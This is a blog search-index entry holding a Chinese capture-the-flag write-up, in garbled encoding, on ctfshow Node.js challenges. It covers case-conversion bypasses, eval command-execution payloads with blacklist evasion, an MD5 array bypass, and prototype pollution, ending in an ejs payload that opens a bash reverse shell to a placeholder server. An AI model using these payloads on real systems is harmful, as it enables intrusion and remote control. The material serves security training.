<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow-nodejs</title>
      <link href="2021/05/04/ctfshow-nodejs/"/>
      <url>2021/05/04/ctfshow-nodejs/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>web342 å¾ˆåˆºæ¿€ ï¼ˆ</p><p>æ„Ÿè§‰å¯¹åŸå‹é“¾æ±¡æŸ“ç†è§£åˆåŠ æ·±äº†å‘¢~</p><h2 id="web334-JS-å¤§å°å†™ç‰¹æ€§"><a href="#web334-JS-å¤§å°å†™ç‰¹æ€§" class="headerlink" title="web334 JS å¤§å°å†™ç‰¹æ€§"></a>web334 JS å¤§å°å†™ç‰¹æ€§</h2><p>æœé›†äº†åŠå¤©ä¿¡æ¯ï¼Œå‘ç°é¢˜ç›®æè¿°å¤„æœ‰æºç å¯ä»¥ç›´æ¥ä¸‹è½½ã€‚ã€‚</p><p>user.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  items: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>login.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).items;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> findUser = <span class="function"><span class="keyword">function</span>(<span class="params">name, password</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> users.find(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">var</span> user = findUser(req.body.username, req.body.password);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(user)&#123;</span><br><span class="line">    req.session.regenerate(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);        </span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      req.session.loginUser = user.username;</span><br><span class="line">      res.json(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>,<span class="attr">ret_flag</span>:flag&#125;);              </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json(&#123;<span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;è´¦å·æˆ–å¯†ç é”™è¯¯&#x27;</span>&#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>å³æ»¡è¶³</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¾“å…¥çš„ <code>name</code> ä¸ä¸º <code>CTFSHOW</code> ç„¶å <code>name</code> è½¬æ¢åçš„å¤§å†™ä¸º <code>CTFSHOW</code> ï¼Œå¯†ç ä¸º <code>123456</code> å³å¯ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619672813007-7c7df6d4-4525-4b61-95a3-469be454413e.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619672813007-7c7df6d4-4525-4b61-95a3-469be454413e.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç½‘ä¸Šçœ‹äº†ä¸€ä¸‹ï¼Œå…¶å®æƒ³è¦çš„è€ƒç‚¹æ˜¯</p><p><code>toUpperCase()</code> å‡½æ•°ï¼Œå­—ç¬¦ Ä± ä¼šè½¬å˜ä¸º I ï¼Œå­—ç¬¦ Å¿ ä¼šå˜ä¸º S ã€‚</p><p><code>toLowerCase()</code> å‡½æ•°ä¸­ï¼Œå­—ç¬¦ Ä° ä¼šè½¬å˜ä¸º i ï¼Œå­—ç¬¦ â„ª ä¼šè½¬å˜ä¸º k ã€‚</p><p>å¯ä»¥å‚è€ƒ</p><p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p>è¿™æ ·çš„åº”è¯¥æ˜¯ï¼Œæ¯”å¦‚å­—ç¬¦ <code>s</code> æˆ– <code>S</code> ä¸èƒ½å‡ºç°åœ¨è¾“å…¥å­—ç¬¦ä¸­å°±å¥½äº†ã€‚</p><h2 id="web335-RCE"><a href="#web335-RCE" class="headerlink" title="web335 RCE"></a>web335 RCE</h2><p>f12 æºç æç¤º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /?eval= --&gt;</span></span><br></pre></td></tr></table></figure><p>å³ç®€å•å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p>è·å– flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?eval&#x3D;require(%27child_process%27).spawnSync(%27cat%27,[%27fl00g.txt%27]).stdout.toString()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619673887207-74b470be-2e6e-4373-8685-2b64df56a093.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619673887207-74b470be-2e6e-4373-8685-2b64df56a093.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web336-RCE-é»‘åå•ç»•è¿‡"><a href="#web336-RCE-é»‘åå•ç»•è¿‡" class="headerlink" title="web336 RCE é»‘åå•ç»•è¿‡"></a>web336 RCE é»‘åå•ç»•è¿‡</h2><p>f12 æºç æç¤º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /?eval= --&gt;</span></span><br></pre></td></tr></table></figure><p>å³ç®€å•å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p>è·å– flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(%27child_process%27).spawnSync(%27cat%27,[%27fl001g.txt%27]).stdout.toString()</span><br></pre></td></tr></table></figure><p>emm å¥½åƒå°± flag æ–‡ä»¶æ¢äº†ä¸ªåå­—ï¼Ÿ</p><p>é¡ºä¾¿æ”¶é›†å¤šå‡ ä¸ªå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).spawnSync(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;.&#x27;</span>]).stdout.toString()</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;ls&#x27;</span>).toString()</span><br><span class="line"><span class="built_in">global</span>.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;.&#x27;</span>]).toString()</span><br></pre></td></tr></table></figure><p>æ”¶é›†è¿‡ç¨‹ä¸­å‘ç°ï¼ŒåŸæ¥ç¬¬ 2ã€3 ä¸ª è¢«ç¦äº†ï¼Œ2333 åŸæ¥è€ƒå¯Ÿé»‘åå•</p><p>å…ˆé€šè¿‡å…¨å±€å˜é‡è¯»å–å½“å‰ç›®å½•ä½ç½®</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=__filename</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674649728-3ffb8fbc-84b6-460f-bd76-6fb2431b405b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674649728-3ffb8fbc-84b6-460f-bd76-6fb2431b405b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å½“å‰ç›®å½•</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=__dirname</span><br></pre></td></tr></table></figure><p>è¯»æ–‡ä»¶</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>å‘ç°è¿‡æ»¤äº†execå’Œload</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674906401-e2c00893-b3b0-488b-a81c-31d46028a825.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674906401-e2c00893-b3b0-488b-a81c-31d46028a825.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç»•è¿‡æ–¹æ³•</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure><p>å› ä¸º <code>require(&#39;child_process&#39;)</code>  æ–¹æ³•è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡ç±»å‹ Pythonæ•°ç»„çš„æ–¹å¼å»è®¿é—®é‡Œé¢çš„æˆå‘˜ã€‚</p><p>æˆ–è€…ç”¨å…¶ä»–æ¨¡å—è¯»æ–‡ä»¶</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿˜æœ‰å…¶ä»–å§¿åŠ¿ï¼Œæ¯”å¦‚å˜é‡æ‹¼æ¥åœ¨æ‰§è¡Œ</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var%20s=%27global.process.mainModule.constructor._lo%27;var%20b=&quot;ad(%27child_process%27).ex&quot;;var%20c=&quot;ec(%27cat+fl001g.txt&gt;public/1.txt%27);&quot;;eval(s%2Bb%2Bc);</span><br></pre></td></tr></table></figure><h2 id="web337-md5ç»•è¿‡"><a href="#web337-md5ç»•è¿‡" class="headerlink" title="web337 md5ç»•è¿‡"></a>web337 md5ç»•è¿‡</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.query.a;</span><br><span class="line">  <span class="keyword">var</span> b = req.query.b;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>å’Œ PHP ä¸€æ ·ï¼Œæ•°ç»„ç»•è¿‡å³å¯</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a[]=1&amp;b=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674410689-1523edd4-f331-49f9-ada3-27953cd41a99.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674410689-1523edd4-f331-49f9-ada3-27953cd41a99.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å‘ç°è¿™æ ·æ›´æ˜“äºç†è§£</p><p>payload: <code>a[x]=1&amp;b[x]=2</code></p><p>è¿è¡Œä¸€ä¸‹ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=[<span class="number">1</span>]</span><br><span class="line">b=[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619676222748-afd5ac3c-95ff-4ea9-b7d7-5fc017ef7dff.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619676222748-afd5ac3c-95ff-4ea9-b7d7-5fc017ef7dff.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web338-åŸå‹é“¾æ±¡æŸ“"><a href="#web338-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web338 åŸå‹é“¾æ±¡æŸ“"></a>web338 åŸå‹é“¾æ±¡æŸ“</h2><p>é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç </p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619675230760-b6f83557-6f65-4002-a134-8d2c0eeca5bb.zip">ğŸ“web338.zip</a></p><p>å…ˆçœ‹çœ‹è¿™ç¯‡æ–‡ç« äº†è§£ä¸€æ³¢ä»€ä¹ˆæ˜¯ JS çš„åŸå‹é“¾æ±¡æŸ“</p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p><p>å…³é”®ä»£ç </p><p>utils/common.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>routes/login.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">....</span><br><span class="line">utils.copy(user,req.body);</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸ç”¨å…³å¿ƒ <code>secert</code> æ˜¯å¦æœ‰ <code>ctfshow</code> è¿™ä¸ªå±æ€§ï¼Œå› ä¸ºå½“å®ƒæ‰¾ä¸åˆ°è¿™ä¸ªå±æ€§æ—¶ï¼Œå®ƒä¼šä»å®ƒè‡ªå·±çš„åŸå‹é‡Œæ‰¾ã€‚</p><p>è¿™é‡Œçš„ <code>secert</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç„¶å <code>utils.copy(user,req.body);</code> æ“ä½œæ˜¯ <code>user</code> ä¹Ÿæ˜¯æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šè¿‡ <code>req.body</code> å³ POST è¯·æ±‚ä½“ä¼ å…¥å‚æ•°ï¼Œé€šè¿‡ <code>user</code> æ±¡æŸ“æ•°ç»„çš„åŸå‹ï¼Œé‚£ä¹ˆ <code>secert</code> æ•°ç»„æ‰¾ä¸åˆ° <code>ctfshow</code> å±æ€§æ—¶ï¼Œä¼šä¸€ç›´å¾€åŸå‹æ‰¾ï¼Œç›´åˆ°åœ¨æ•°ç»„åŸå‹ä¸­å‘ç° <code>ctfshow</code> å±æ€§å€¼ä¸º <code>36dboy</code> ã€‚é‚£ä¹ˆ <code>if</code> è¯­å¥å³åˆ¤æ–­æˆåŠŸï¼Œå°±ä¼šè¾“å‡º flag äº†ã€‚</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;ctfshow&quot;</span>: <span class="string">&quot;36dboy&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619686041322-ea3afafd-c050-401e-ac62-92c906083202.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619686041322-ea3afafd-c050-401e-ac62-92c906083202.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¸€èˆ¬é‡åˆ°è¿™ç§æ•´å¥—ä»£ç ï¼Œç‰¹åˆ«æ˜¯å¸¦æœ‰ package.json çš„ï¼Œå¯ä»¥å°è¯• <a href="https://snyk.io/">snyk</a> ï¼Œ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619833506599-02525d9f-0a41-4ee3-90e2-62683c6164bf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619833506599-02525d9f-0a41-4ee3-90e2-62683c6164bf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å‘ç°ä¸ª <code>ejs</code> çš„ RCE</p><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>å…ˆæ±¡æŸ“å‚æ•°</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836696555-62e2a481-996f-4ff0-a3c2-29a70383cd6b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836696555-62e2a481-996f-4ff0-a3c2-29a70383cd6b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç„¶åéšä¾¿è¯·æ±‚ä¸€ä¸‹ï¼Œè§¦å‘ <code>render</code> æ–¹æ³•</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836723109-6bdc2f7e-4cec-4da9-84bc-cc1924fd1f03.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836723109-6bdc2f7e-4cec-4da9-84bc-cc1924fd1f03.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 